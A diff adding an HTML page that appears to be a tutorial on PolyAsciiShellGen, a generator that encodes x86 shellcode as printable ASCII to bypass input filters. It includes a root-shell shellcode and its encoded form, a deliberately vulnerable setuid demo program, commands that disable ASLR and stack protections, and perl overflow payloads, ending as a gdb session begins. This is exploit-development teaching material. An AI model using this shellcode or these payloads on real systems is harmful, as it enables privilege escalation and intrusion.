@@ -1,0 +1,1586 @@
+<!DOCTYPE html>
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0" name="viewport"/>
+  <title>
+   Vincent Dary's website
+  </title>
+  <link href="/static/css/core.css" rel="stylesheet" type="text/css"/>
+ </head>
+ <body>
+  <div id="j">
+   <div id="a">
+    <div id="f">
+     <div class="by" id="chunk-left">
+     </div>
+     <div id="l">
+      <div class="e">
+       <div id="k" style="font-weight: 900;">
+        <a href="../..">
+         &lt;--- Back Home
+        </a>
+       </div>
+       <h1 id="article-title">
+        PolyAsciiShellGen: Caezar ASCII Shellcode Generator
+       </h1>
+       <div class="q" id="article-meta">
+        <div id="article-author">
+         By Vincent Dary
+        </div>
+        <div id="article-publish-date">
+         Publish Date: 2015-07-11
+        </div>
+        <div id="article-last-update">
+         Last Update: 2018-05-20
+        </div>
+       </div>
+       <hr id="i"/>
+       <div class="u" id="o">
+        <div id="h">
+         <ul>
+          <li>
+           <a class="toc-href" href="#1-introduction" title="1 - Introduction">
+            1 - Introduction
+           </a>
+          </li>
+          <li>
+           <a class="toc-href" href="#2-caezar-ascii-shellcode" title="2 - Caezar ASCII Shellcode">
+            2 - Caezar ASCII Shellcode
+           </a>
+           <ul>
+            <li>
+             <a class="toc-href" href="#21-goal" title="2.1 - Goal">
+              2.1 - Goal
+             </a>
+            </li>
+            <li>
+             <a class="toc-href" href="#22-mechanism" title="2.2 - Mechanism">
+              2.2 - Mechanism
+             </a>
+            </li>
+           </ul>
+          </li>
+          <li>
+           <a class="toc-href" href="#3-polyasciishellgen_1" title="3 - PolyAsciiShellGen">
+            3 - PolyAsciiShellGen
+           </a>
+           <ul>
+            <li>
+             <a class="toc-href" href="#31-build" title="3.1 - Build">
+              3.1 - Build
+             </a>
+            </li>
+            <li>
+             <a class="toc-href" href="#32-usage" title="3.2 - Usage">
+              3.2 - Usage
+             </a>
+            </li>
+            <li>
+             <a class="toc-href" href="#33-options" title="3.3 - Options">
+              3.3 - Options
+             </a>
+            </li>
+            <li>
+             <a class="toc-href" href="#34-result" title="3.4 - Result">
+              3.4 - Result
+             </a>
+            </li>
+            <li>
+             <a class="toc-href" href="#35-return-value" title="3.5 - Return Value">
+              3.5 - Return Value
+             </a>
+            </li>
+            <li>
+             <a class="toc-href" href="#36-exemple" title="3.6 - Exemple">
+              3.6 - Exemple
+             </a>
+            </li>
+           </ul>
+          </li>
+          <li>
+           <a class="toc-href" href="#4-demo_1" title="4 - Demo">
+            4 - Demo
+           </a>
+           <ul>
+            <li>
+             <a class="toc-href" href="#41-vulnerable-program-sample" title="4.1 - Vulnerable Program Sample">
+              4.1 - Vulnerable Program Sample
+             </a>
+            </li>
+            <li>
+             <a class="toc-href" href="#42-exploitation-environment-setting" title="4.2 - Exploitation Environment Setting">
+              4.2 - Exploitation Environment Setting
+             </a>
+            </li>
+            <li>
+             <a class="toc-href" href="#43-exec-wrapper" title="4.3 - Exec Wrapper">
+              4.3 - Exec Wrapper
+             </a>
+            </li>
+            <li>
+             <a class="toc-href" href="#44-quick-manual-exploitation" title="4.4 - Quick Manual Exploitation">
+              4.4 - Quick Manual Exploitation
+             </a>
+            </li>
+            <li>
+             <a class="toc-href" href="#45-automated-demo-in-gdb" title="4.5 - Automated Demo in gdb">
+              4.5 - Automated Demo in gdb
+             </a>
+            </li>
+           </ul>
+          </li>
+          <li>
+           <a class="toc-href" href="#5-conclusion_1" title="5 - conclusion">
+            5 - conclusion
+           </a>
+          </li>
+          <li>
+           <a class="toc-href" href="#6-links" title="6 - Links">
+            6 - Links
+           </a>
+          </li>
+         </ul>
+        </div>
+       </div>
+       <div id="m">
+        <h2 id="1-introduction">
+         1 - Introduction
+        </h2>
+        <hr>
+         <p>
+          PolyAsciiShellGen is an experimental ASCII shellcode generator, I have written
+in C. This program is based on the Riley "Caezar" Eller's technique to bypass
+MSB data filters, for buffer overflow exploits, on Intel x86 platforms.
+         </p>
+         <h2 id="2-caezar-ascii-shellcode">
+          2 - Caezar ASCII Shellcode
+         </h2>
+         <hr/>
+         <h3 id="21-goal">
+          2.1 - Goal
+         </h3>
+         <p>
+          In some case of buffer overflow exploitation it is possible to need to use
+input buffer restricted by some filters which allow only printable caracters as
+input data. For example urls, paths, requests etc... are sanitized
+for invalid characters before being used in a program.
+These buffer restrictions limit drastically the value ranges of input data and
+defeat the use of classic shellcode composed by opcodes include in a larges
+value ranges that can't pass the data filters. The paper
+          <a href="http://julianor.tripod.com/bc/bypass-msb.txt" target="_blank">
+           <em>
+            "Bypassing MSB Data Filters for Buffer Overflows on Intel Plateform"
+           </em>
+           [1]
+          </a>
+          by
+          <em>
+           Riley "Caezar" Eller
+          </em>
+          is the first to present an algorithm to encode any
+sequence of binary data like a shellcode into ASCII characters which can then be
+decoded, loaded and executed with a reduce set of printable opcodes on x86 Intel
+plateform. The kind of ASCII shellcode exposes in this
+paper can pass some types of ASCII filters of a target program with a full ASCII
+machine code in order to exploit a vulnerability like a buffer overflow. An
+ASCII shellcode must use opcode in the range 0x20 to 0x7E or other sub ranges in
+the ASCII range, there are many
+          <a href="../../blog-posts/polyasciishellgen-caezar-ascii-shellcode-generator/x86-printable-opcode-table.pdf" target="_blank">
+           x86 printable opcode tables [2]
+          </a>
+          which shows the matching between ASCII code and machine instruction.
+         </p>
+         <h3 id="22-mechanism">
+          2.2 - Mechanism
+         </h3>
+         <p>
+          The
+          <em>
+           Caezar
+          </em>
+          ASCII shellcodes work according the technique of the
+          <em>
+           bridge building
+          </em>
+          as explain in the "Caezar" paper.
+         </p>
+         <p>
+          <em>
+           "move the stack pointer just past the ASCII code, decode 32-bits of the
+original sequence at a time, and push that value onto the stack. As the decoding
+progresses, the original binary series is "grown" toward the end of the ASCII
+code. When the ASCII code executes its last PUSH instruction, the first bytes of
+the exploit code are put into place at the next memory address for the processor
+to execute. "
+          </em>
+         </p>
+         <p>
+          Here, an illustration  which shows a
+          <em>
+           Caezar
+          </em>
+          ASCII shellcode in action during a
+classic stack buffer overflow on Intel x86.
+         </p>
+         <pre class="h pdf_dec_ascii_schema" style="font-size: 9px; font-weight: bold;">
+
+1)     Low addresses       2)   Low addresses      2)    Low addresses       3)   Low addresses      
+      |             |          |             |          |             |          |             |
+      |             |          |             |          |             |          |             |
+      |             |          |             |          |             |          |             |
+esp--&gt;|             |          |             |          |             |          |             |
+      |             |          |             |          |             |          |             |
+      |             |          |             |          |             |          |             |
+      |             |          |             |          |             |          |             |
+      |             |          |             |          |             |          |             |
+      |             |          |             |          |             |          |             |
+      |             |          |             |          |             |          |             |
+<b class="ca">eip</b>--&gt;|-------------|          |-------------|          |-------------|          |-------------|
+      |             |          |             |          |             |          |             |
+      |   ASCII     |          |    ASCII    |          |    ASCII    |          |    ASCII    |
+      |  shellcode  |    <b class="ca">eip</b>--&gt;|  shellcode  |          |  shellcode  |          |  shellcode  |
+      |             |          |             |          |             |          |             |
+      |             |          |             |          |             |          |             |
+      |             |          |             |          |             |          |             |
+      |             |          |             |    <b class="ca">eip</b>--&gt;|             |          |             |      
+      |             |          |             |          |             |    <b class="ca">eip</b>   |             |
+      |-------------|          |-------------|          |-------------|       --&gt;|-------------|
+      |             |          |             |          |             |    esp   |             |
+      |             |          |             |          |             |          |             |
+      |             |          |             |          |             |          |   decoded   |
+      |             |          |             |          |             |          |   shellcode |
+      |             |          |             |    esp--&gt;|-------------|          |             |
+      |             |          |             |          |             |          |             |
+      |             |          |             |          |   decoded   |          |             |
+      |             |          |             |          |   shellcode |          |             |
+      |             |          |             |          |             |          |             |
+      |             |          |             |          |             |          |             |
+      |             |    esp--&gt;|             |          |-------------|          |-------------|
+      |             |          |             |          |             |          |             |
+      |             |          |             |          |             |          |             |
+      |             |          |             |          |             |          |             |
+      |             |          |             |          |             |          |             |
+       High addresses           High addresses           High addresses           High addresses
+</pre>
+         <ul>
+          <li>
+           <p>
+            <strong>
+             1)
+            </strong>
+            Fix ESP after the ASCII shellcode with some space to build the decoded shellcode.
+           </p>
+          </li>
+          <li>
+           <p>
+            <strong>
+             2)
+            </strong>
+            EIP start to decode the encoded shellcode and push it on the stack by group of four bytes, so ESP grow down and EIP grow up. The bridge to the decoded shellcode is building.
+           </p>
+          </li>
+          <li>
+           <p>
+            <strong>
+             3)
+            </strong>
+            The first bytes of the decoded shellcode are push just after the end of the ASCII shellcode, ESP and EIP are crossing at the same memory address  and EIP will execute the decoded shellcode
+           </p>
+          </li>
+         </ul>
+         <h2 id="3-polyasciishellgen_1">
+          3 - PolyAsciiShellGen
+         </h2>
+         <hr/>
+         <p>
+          PolyAsciiShellGen is an experimental ASCII shellcode generator based on
+the part II of the
+          <em>
+           Riley "Caezar" Eller
+          </em>
+          's paper. The program take a classic
+shellcode in entry and automates the shellcode encoding process into ASCII
+caracteres and assemble an ASCII shellcode able to decode, load and
+execute the original shellcode.
+         </p>
+         <h3 id="31-build">
+          3.1 - Build
+         </h3>
+         <p>
+          Clone PolyAsciiShellGen from
+          <a href="https://github.com/VincentDary/PolyAsciiShellGen" target="_blank">
+           my Github repository [3]
+          </a>
+          and build it.
+         </p>
+         <pre class="bb">
+$ git clone https://github.com/VincentDary/PolyAsciiShellGen.git
+$ cd PolyAsciiShellGen
+$ make &amp;&amp; make clean
+</pre>
+         <h3 id="32-usage">
+          3.2 - Usage
+         </h3>
+         <pre class="bb">
+$ ./PolyAsciiShellGen
+usage: PolyAsciiShellGen &lt;esp offset&gt; &lt;nop sleed factor N * 4 NOPS&gt; &lt;shellcode "\xOP\xOP"...&gt;
+</pre>
+         <h3 id="33-options">
+          3.3 - Options
+         </h3>
+         <p>
+          <strong>
+           <code>
+            &lt;esp offset&gt;
+           </code>
+          </strong>
+         </p>
+         <p>
+          The
+          <em>
+           <code>
+            esp offset
+           </code>
+          </em>
+          parameter is a 32 bit integer, positive or negative.
+When the generated ASCII shellcode is executed it starts to add the
+          <em>
+           <code>
+            esp offset
+           </code>
+          </em>
+          to ESP in order to set the register position after its code
+with enough space to build the decoded shellcode as a bridge to the code of the
+ASCII shellcode. This value is generaly deduct during a pre-exploitation
+debugging session. If a NOP sleed is add before the decoded shellcode via the
+          <em>
+           <code>
+            NOP sleed factor
+           </code>
+          </em>
+          , the
+          <em>
+           <code>
+            esp offset
+           </code>
+          </em>
+          value can have a margin of error
+according the size of the NOP sleed use. Here the method to compute the
+          <em>
+           <code>
+            esp offset
+           </code>
+          </em>
+          .
+         </p>
+         <pre class="bb">
+ esp_offset = @shellcode_ascii_start_address - @esp_address
+              + ascii_shellcode_size
+              + original_shellcode_size
+</pre>
+         <p>
+          Note: the
+          <code>
+           ascii_shellcode_size
+          </code>
+          must be padded on a 32-bit boundary.
+         </p>
+         <p>
+          <strong>
+           <code>
+            &lt;nop sleed factor&gt;
+           </code>
+          </strong>
+         </p>
+         <p>
+          The
+          <em>
+           <code>
+            nop sleed factor
+           </code>
+          </em>
+          parameter is a 32 bit unsigned integer use as a NOP
+sleed multiplier to add an extra NOP sleed before the first instructions of the
+decoded shellcode in order to reliable the decoded shellcode execution. This
+factor is multiplied to four NOP instructions. So if N=4, 4*4=16 NOP
+instructions are added before the shellcode.
+         </p>
+         <p>
+          <strong>
+           <code>
+            &lt;shellcode&gt;
+           </code>
+          </strong>
+         </p>
+         <p>
+          The
+          <code>
+           shellcode
+          </code>
+          parameters is the shellcode to encode in escaping format
+          <code>
+           ...\xcd\x80...
+          </code>
+          .If the lenght of the shellcode is not a multiplier of four bytes, it
+is padded with extra NOP bytes in order to pass an exploit code aligned on a 32-bit
+boundary to the underlying ASCII shellcode generator.
+         </p>
+         <h3 id="34-result">
+          3.4 - Result
+         </h3>
+         <p>
+          PolyAsciiShellGen print the resulting ASCII shellcode on the standard output. The
+ASCII charset use for the ASCII shellcode building is the following.
+         </p>
+         <pre class="bb">
+ %_01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-
+</pre>
+         <p>
+          To encode the original shellcode, the underlying encoder uses values generated
+randomly at each execution. So, the printable shellcodes generated have a
+different signatures from the original shellcode at each new generation.
+         </p>
+         <h3 id="35-return-value">
+          3.5 - Return Value
+         </h3>
+         <p>
+          The command returns 0 if the ASCII shellcode generation is successful or 1 if
+it fails.
+         </p>
+         <h3 id="36-exemple">
+          3.6 - Exemple
+         </h3>
+         <p>
+          Here an example with a
+          <code>
+           setresuid(0,0,0); execve(/bin//sh,0,0)
+          </code>
+          shellcode.
+         </p>
+         <pre class="bb">
+$ ./PolyAsciiShellGen -270  10  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xcd\x80\x31\xc0\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80"
+TX-KKKK-KKKK-xjiiP\%0000%AAAA-9%%%-GJJJP-hhNh-th3%-Q6-5P-yyyZ-yZy6-L6---2-8-P-7KKd-%Kdz-%RkzP-xxxx-GGGx-0AFiP-OOOO-jOwO-iaraP-NN%N-a%%a-q44tP-%SS0-%SL5-7uC%P-FkFF-9pUhP-XXXX-XXXX-PXOFP-AAAj-0w2j-0w-vPPPPPPPPPP
+</pre>
+         <h2 id="4-demo_1">
+          4 - Demo
+         </h2>
+         <hr/>
+         <p>
+          This demo shows an exploitation case with PolyAsciiShellGen, all the scripts
+and compiled binaries uses here can be found in the
+          <a href="https://github.com/VincentDary/PolyAsciiShellGen/tree/master/demo" target="_blank">
+           demo directory of the PolyAsciiShellGen repository [3]
+          </a>
+          .
+         </p>
+         <pre class="bb">
+$ git clone https://github.com/VincentDary/PolyAsciiShellGen.git
+$ cd PolyAsciiShellGen/demo
+</pre>
+         <h3 id="41-vulnerable-program-sample">
+          4.1 - Vulnerable Program Sample
+         </h3>
+         <p>
+          The demo uses a little program vulnerable to a stack buffer overflow.
+The vulnerability designed here is a typical school
+case which shows when an ASCII shellcode can be useful in a buffer overflow
+exploitation.
+         </p>
+         <p>
+          <a href="https://raw.githubusercontent.com/VincentDary/PolyAsciiShellGen/master/demo/vuln_ascii_filter_sample.c" target="_blank">
+           <em>
+            vuln_ascii_filter_sample.c
+           </em>
+          </a>
+         </p>
+         <div class="a">
+          <pre><span></span><code><span class="db">#include</span><span class="fv"> </span><span class="cq">&lt;string.h&gt;</span>
+<span class="db">#include</span><span class="fv"> </span><span class="cq">&lt;stdlib.h&gt;</span>
+<span class="db">#include</span><span class="fv"> </span><span class="cq">&lt;stdio.h&gt;</span>
+<span class="db">#include</span><span class="fv"> </span><span class="cq">&lt;ctype.h&gt;</span>
+
+<span class="db">#define BOOK_COMMENT_MAX_LEN 512</span>
+<span class="db">#define BOOK_REF_MAX_LEN 48</span>
+
+<span class="fk">struct</span><span class="fv"> </span><span class="em">book_info</span><span class="fv"> </span><span class="ft">{</span>
+<span class="fv">  </span><span class="dg">char</span><span class="fv"> </span><span class="fo">comment</span><span class="ft">[</span><span class="fo">BOOK_COMMENT_MAX_LEN</span><span class="ft">];</span>
+<span class="fv">  </span><span class="dg">char</span><span class="fv"> </span><span class="fo">book_ref</span><span class="ft">[</span><span class="eb">8</span><span class="ft">];</span><span class="fv"> </span><span class="dh">/* programming error */</span>
+<span class="ft">};</span>
+
+<span class="dg">int</span><span class="fv"> </span><span class="ek">register_book</span><span class="ft">(){</span>
+<span class="fv">  </span><span class="fk">struct</span><span class="fv"> </span><span class="em">book_info</span><span class="fv"> </span><span class="fo">b_info</span><span class="ft">;</span>
+<span class="fv">  </span><span class="dg">size_t</span><span class="fv"> </span><span class="fo">comment_size</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="eb">0</span><span class="ft">;</span>
+<span class="fv">  </span><span class="dg">size_t</span><span class="fv"> </span><span class="fo">i</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="eb">0</span><span class="ft">;</span>
+
+<span class="fv">  </span><span class="fo">memset</span><span class="ft">(</span><span class="fp">&amp;</span><span class="fo">b_info</span><span class="ft">,</span><span class="fv"> </span><span class="eb">0</span><span class="ft">,</span><span class="fv"> </span><span class="fk">sizeof</span><span class="ft">(</span><span class="fo">b_info</span><span class="ft">));</span>
+
+<span class="fv">  </span><span class="fo">printf</span><span class="ft">(</span><span class="fu">"[0x%x] @b_info.comment</span><span class="ef">\n</span><span class="fu">"</span><span class="ft">,</span><span class="fv"> </span><span class="fp">&amp;</span><span class="fo">b_info</span><span class="ft">.</span><span class="fo">comment</span><span class="ft">);</span>
+<span class="fv">  </span><span class="fo">printf</span><span class="ft">(</span><span class="fu">"[0x%x] @b_info.book_ref</span><span class="ef">\n</span><span class="fu">"</span><span class="ft">,</span><span class="fv"> </span><span class="fp">&amp;</span><span class="fo">b_info</span><span class="ft">.</span><span class="fo">book_ref</span><span class="ft">);</span>
+
+<span class="fv">  </span><span class="fo">puts</span><span class="ft">(</span><span class="fu">"[+] Enter a book reference: "</span><span class="ft">);</span>
+<span class="fv">  </span><span class="fk">if</span><span class="ft">(</span><span class="fv"> </span><span class="fo">fgets</span><span class="ft">(</span><span class="fo">b_info</span><span class="ft">.</span><span class="fo">book_ref</span><span class="ft">,</span><span class="fv"> </span><span class="fo">BOOK_REF_MAX_LEN</span><span class="eb">-1</span><span class="ft">,</span><span class="fv"> </span><span class="fo">stdin</span><span class="ft">)</span><span class="fv"> </span><span class="fp">==</span><span class="fv"> </span><span class="en">NULL</span><span class="fv"> </span><span class="ft">)</span>
+<span class="fv">    </span><span class="fk">return</span><span class="fv"> </span><span class="eb">-1</span><span class="ft">;</span>
+
+<span class="fv">  </span><span class="fo">puts</span><span class="ft">(</span><span class="fu">"[+] Enter a book commentary: "</span><span class="ft">);</span>
+<span class="fv">  </span><span class="fk">if</span><span class="ft">(</span><span class="fv"> </span><span class="fo">fgets</span><span class="ft">(</span><span class="fo">b_info</span><span class="ft">.</span><span class="fo">comment</span><span class="ft">,</span><span class="fv"> </span><span class="fo">BOOK_COMMENT_MAX_LEN</span><span class="eb">-1</span><span class="ft">,</span><span class="fv"> </span><span class="fo">stdin</span><span class="ft">)</span><span class="fv"> </span><span class="fp">==</span><span class="fv"> </span><span class="en">NULL</span><span class="fv"> </span><span class="ft">)</span>
+<span class="fv">    </span><span class="fk">return</span><span class="fv"> </span><span class="eb">-1</span><span class="ft">;</span>
+
+<span class="fv">  </span><span class="dh">/* ASCII filter 0x20 to 0x7E */</span>
+<span class="fv">  </span><span class="fo">comment_size</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="fo">strlen</span><span class="ft">(</span><span class="fo">b_info</span><span class="ft">.</span><span class="fo">comment</span><span class="ft">);</span>
+<span class="fv">  </span><span class="fk">for</span><span class="ft">(</span><span class="fv"> </span><span class="fo">i</span><span class="fp">=</span><span class="eb">0</span><span class="ft">;</span><span class="fv"> </span><span class="fo">i</span><span class="fv"> </span><span class="fp">&lt;</span><span class="fv"> </span><span class="fo">comment_size</span><span class="eb">-1</span><span class="ft">;</span><span class="fv"> </span><span class="fp">++</span><span class="fo">i</span><span class="fv"> </span><span class="ft">){</span>
+<span class="fv">    </span><span class="fk">if</span><span class="ft">(</span><span class="fp">!</span><span class="fv"> </span><span class="ft">(</span><span class="fo">isprint</span><span class="ft">(</span><span class="fo">b_info</span><span class="ft">.</span><span class="fo">comment</span><span class="ft">[</span><span class="fo">i</span><span class="ft">]))</span><span class="fv"> </span><span class="ft">){</span>
+<span class="fv">      </span><span class="fo">memset</span><span class="ft">(</span><span class="fp">&amp;</span><span class="fo">b_info</span><span class="ft">,</span><span class="fv"> </span><span class="eb">0</span><span class="ft">,</span><span class="fv"> </span><span class="fk">sizeof</span><span class="ft">(</span><span class="fo">b_info</span><span class="ft">));</span>
+<span class="fv">      </span><span class="fk">return</span><span class="fv"> </span><span class="eb">-1</span><span class="ft">;</span>
+<span class="fv">    </span><span class="ft">}</span>
+<span class="fv">  </span><span class="ft">}</span>
+
+<span class="fv">  </span><span class="fo">puts</span><span class="ft">(</span><span class="fu">"[+] Book registered."</span><span class="ft">);</span>
+<span class="fv">  </span><span class="fo">printf</span><span class="ft">(</span><span class="fu">"</span><span class="ef">\n</span><span class="fu">reference: %s</span><span class="ef">\n</span><span class="fu">commentary: %s</span><span class="ef">\n</span><span class="fu">"</span><span class="ft">,</span><span class="fv"> </span><span class="fo">b_info</span><span class="ft">.</span><span class="fo">book_ref</span><span class="ft">,</span><span class="fv"> </span><span class="fo">b_info</span><span class="ft">.</span><span class="fo">comment</span><span class="ft">);</span>
+<span class="fv">  </span><span class="fk">return</span><span class="fv"> </span><span class="eb">0</span><span class="ft">;</span>
+<span class="ft">}</span>
+
+<span class="dg">int</span><span class="fv"> </span><span class="ek">main</span><span class="ft">(</span><span class="dg">int</span><span class="fv"> </span><span class="fo">argc</span><span class="ft">,</span><span class="fv"> </span><span class="dg">char</span><span class="fv"> </span><span class="fp">*</span><span class="fo">argv</span><span class="ft">[]){</span>
+<span class="fv">  </span><span class="fk">if</span><span class="ft">(</span><span class="fv"> </span><span class="fo">register_book</span><span class="ft">()</span><span class="fv"> </span><span class="fp">&lt;</span><span class="fv"> </span><span class="eb">0</span><span class="fv"> </span><span class="ft">){</span>
+<span class="fv">    </span><span class="fo">puts</span><span class="ft">(</span><span class="fu">"[-] Error during book registering."</span><span class="ft">);</span>
+<span class="fv">    </span><span class="fk">return</span><span class="fv"> </span><span class="eb">1</span><span class="ft">;</span>
+<span class="fv">  </span><span class="ft">}</span>
+<span class="fv">  </span><span class="fk">return</span><span class="fv"> </span><span class="eb">0</span><span class="ft">;</span>
+<span class="ft">}</span>
+</code></pre>
+         </div>
+         <p>
+          The stack buffer overflow vulnerability exposed here is introduce by the
+          <code>
+           book_info
+          </code>
+          structure definition which use an hardcoded value as buffer
+lenght definition of its
+          <code>
+           book_ref
+          </code>
+          member. It not use the
+          <code>
+           BOOK_REF_MAX_LEN
+          </code>
+          define just before which have value higher.
+         </p>
+         <p>
+          Then, in the
+          <code>
+           register_book()
+          </code>
+          function, a
+          <code>
+           fgets()
+          </code>
+          call get the book reference
+from the user input and store it in the
+          <code>
+           b_info.book_ref
+          </code>
+          local buffer, but the
+the maximum lenght of the string pass as second parameter to
+          <code>
+           fgets()
+          </code>
+          is the
+          <code>
+           BOOK_REF_MAX_LEN
+          </code>
+          value higher than the target buffer size.
+         </p>
+         <p>
+          This common C programming error can lead to a stack buffer overflow in the
+          <code>
+           b_info
+          </code>
+          local data struture of
+          <code>
+           register_book()
+          </code>
+          via its
+          <code>
+           book_ref
+          </code>
+          member.
+         </p>
+         <h3 id="42-exploitation-environment-setting">
+          4.2 - Exploitation Environment Setting
+         </h3>
+         <p>
+          In this demo, the exploitation conditions are the most basic with all the
+security features against buffer overflow exploitation deactivated and a
+vulnerable binary with root owner and the setuid bit setted.
+         </p>
+         <p>
+          The ASLR is set to off in order to use a predictable addresses to redirect the
+execution flow to the injected shellcode.
+         </p>
+         <pre class="bb">
+# echo 0 &gt; /proc/sys/kernel/randomize_va_space
+</pre>
+         <p>
+          The previous program is compiled with gcc in 32 bit (
+          <code>
+           -m32
+          </code>
+          ) with an
+executable stack (
+          <code>
+           -z execstack
+          </code>
+          ), the stack canaries disable
+(
+          <code>
+           -fno-stack-protector
+          </code>
+          ) and a position dependent code (
+          <code>
+           -no-pie
+          </code>
+          ).
+         </p>
+         <pre class="bb">
+$ gcc vuln_ascii_filter_sample.c -o vuln_ascii_filter_sample \
+      -m32 \
+      -z execstack \
+      -fno-stack-protector \
+      -no-pie
+</pre>
+         <p>
+          The executable file is setted with the root owner and the setuid bit.
+         </p>
+         <pre class="bb">
+# chown root vuln_ascii_filter_sample
+# chmod u+s vuln_ascii_filter_sample
+# ls -l vuln_ascii_filter_sample
+-rwsr-xr-x 1 root root 7068 Jul  6 02:37 vuln_ascii_filter_sample
+</pre>
+         <div class="pdf_h3_43_break_before">
+         </div>
+         <h3 id="43-exec-wrapper">
+          4.3 - Exec Wrapper
+         </h3>
+         <p>
+          In order to work with an equal stack offset in or out of the debugger and
+in any working directory location; a slim executor wrapper is used to start the
+program in an empty environment. It is just an
+          <code>
+           execve()
+          </code>
+          which start the
+          <code>
+           ./vuln_ascii_filter_sample
+          </code>
+          binary present in the same directory.
+         </p>
+         <p>
+          <a href="https://raw.githubusercontent.com/VincentDary/PolyAsciiShellGen/master/demo/exec_wrapper.c" target="_blank">
+           <em>
+            exec_wrapper.c
+           </em>
+          </a>
+         </p>
+         <div class="a">
+          <pre><span></span><code><span class="db">#include</span><span class="fv"> </span><span class="cq">&lt;unistd.h&gt;</span>
+<span class="db">#include</span><span class="fv"> </span><span class="cq">&lt;stdio.h&gt;</span>
+<span class="db">#include</span><span class="fv"> </span><span class="cq">&lt;string.h&gt;</span>
+<span class="db">#include</span><span class="fv"> </span><span class="cq">&lt;errno.h&gt;</span>
+
+<span class="dg">int</span><span class="fv"> </span><span class="ek">main</span><span class="ft">(</span><span class="dg">int</span><span class="fv"> </span><span class="fo">argc</span><span class="ft">,</span><span class="fv"> </span><span class="dg">char</span><span class="fv"> </span><span class="fp">*</span><span class="fo">argv</span><span class="ft">[])</span>
+<span class="ft">{</span>
+<span class="fv">    </span><span class="dg">int</span><span class="fv"> </span><span class="fo">e</span><span class="ft">;</span>
+<span class="fv">    </span><span class="dg">char</span><span class="fv"> </span><span class="fo">exec_bin_name</span><span class="ft">[]</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="fu">"./vuln_ascii_filter_sample"</span><span class="ft">;</span>
+<span class="fv">    </span><span class="dg">char</span><span class="fv"> </span><span class="fp">*</span><span class="fo">exec_argv</span><span class="ft">[]</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="ft">{</span><span class="fv"> </span><span class="fo">exec_bin_name</span><span class="ft">,</span><span class="fv"> </span><span class="en">NULL</span><span class="fv"> </span><span class="ft">};</span>
+<span class="fv">    </span><span class="dg">char</span><span class="fv"> </span><span class="fp">*</span><span class="fo">exec_envp</span><span class="ft">[]</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="ft">{</span><span class="fv"> </span><span class="en">NULL</span><span class="fv"> </span><span class="ft">};</span>
+
+<span class="fv">    </span><span class="fo">printf</span><span class="ft">(</span><span class="fu">"</span><span class="ef">\n\n</span><span class="fu">[demo exec wrapper] Executing %s</span><span class="ef">\n\n</span><span class="fu">"</span><span class="ft">,</span><span class="fv"> </span><span class="fo">exec_bin_name</span><span class="ft">);</span>
+
+<span class="fv">    </span><span class="fo">e</span><span class="fv"> </span><span class="fp">=</span><span class="fv"> </span><span class="fo">execve</span><span class="ft">(</span><span class="fo">exec_bin_name</span><span class="ft">,</span><span class="fv"> </span><span class="fo">exec_argv</span><span class="ft">,</span><span class="fv"> </span><span class="fo">exec_envp</span><span class="ft">);</span>
+
+<span class="fv">    </span><span class="fk">if</span><span class="fv"> </span><span class="ft">(</span><span class="fo">e</span><span class="fv"> </span><span class="fp">==</span><span class="fv"> </span><span class="eb">-1</span><span class="ft">)</span>
+<span class="fv">        </span><span class="fo">fprintf</span><span class="ft">(</span><span class="fo">stderr</span><span class="ft">,</span><span class="fv"> </span><span class="fu">"[demo exec wrapper] error %s</span><span class="ef">\n</span><span class="fu">"</span><span class="ft">,</span><span class="fv"> </span><span class="fo">strerror</span><span class="ft">(</span><span class="fo">errno</span><span class="ft">));</span>
+
+<span class="fv">    </span><span class="fk">return</span><span class="fv"> </span><span class="eb">0</span><span class="ft">;</span>
+<span class="ft">}</span>
+</code></pre>
+         </div>
+         <p>
+          For this demonstration, the wrapper script is compiled in 32 bit.
+         </p>
+         <pre class="bb">
+$ gcc -m32 exec_wrapper.c -o exec_wrapper
+</pre>
+         <h3 id="44-quick-manual-exploitation">
+          4.4 - Quick Manual Exploitation
+         </h3>
+         <p>
+          First step, a crafted input is passed to the standard input of the vulnerable
+program example to trigger the stack buffer overflow in the
+          <code>
+           b_info.book_ref
+          </code>
+          local buffer and hijacks the program execution flow by rewriting the return
+address of the
+          <code>
+           register_book()
+          </code>
+          function.
+         </p>
+         <pre class="bb">
+$ ( perl -e 'print "A"x24 . "\xef\xbe\xad\xde"  . "\n" . "book-comment\n"';  cat ) | ./exec_wrapper
+
+[demo exec wrapper] Executing ./vuln_ascii_filter_sample
+
+[<b class="ca">0xffffdc24</b>] @b_info.comment
+[0xffffde24] @b_info.book_ref
+[+] Enter a book reference:
+[+] Enter a book commentary:
+[+] Book registered.
+
+reference: AAAA
+commentary: book-comment
+
+Segmentation fault
+</pre>
+         <p>
+          The return address is overwritten with the
+          <code>
+           0xdeadbeef
+          </code>
+          value and the program
+crash. The crash hits the system logs and the log shows the position of the
+stack pointer at this moment.
+         </p>
+         <pre class="bb">
+$ journalctl -f
+Oct 02 18:12:50 babylone kernel: vuln_ascii_filt[22754]: segfault at deadbeef <b class="ca">ip 00000000deadbeef</b> <b class="ca">sp 00000000ffffde40</b> error 14 in libc-2.28.so[f7dc4000+1d6000]
+</pre>
+         <p>
+          The buffer overflow show here can't past more than 47 bytes (
+          <code>
+           BOOK_REF_MAX_LEN
+          </code>
+          -1)
+on the stack via the
+          <code>
+           b_info.book_ref
+          </code>
+          buffer. In addition, the code of the
+          <code>
+           register_book()
+          </code>
+          function overwrites a part of the injected payload,
+caused by the presence of other variables placed after the buffer overflowed.
+Below, a quick debugging session of the crash which shows the overwrite of
+the payload in red.
+         </p>
+         <pre class="bb">
+$ perl -e 'print "A"x24 . "\xef\xbe\xad\xde" . "A"x19 . "\n" . "book-comment\n"' &gt; /tmp/payload_crash
+$ gdb -q ./vuln_ascii_filter_sample
+Reading symbols from ./vuln_ascii_filter_sample...(no debugging symbols found)...done.
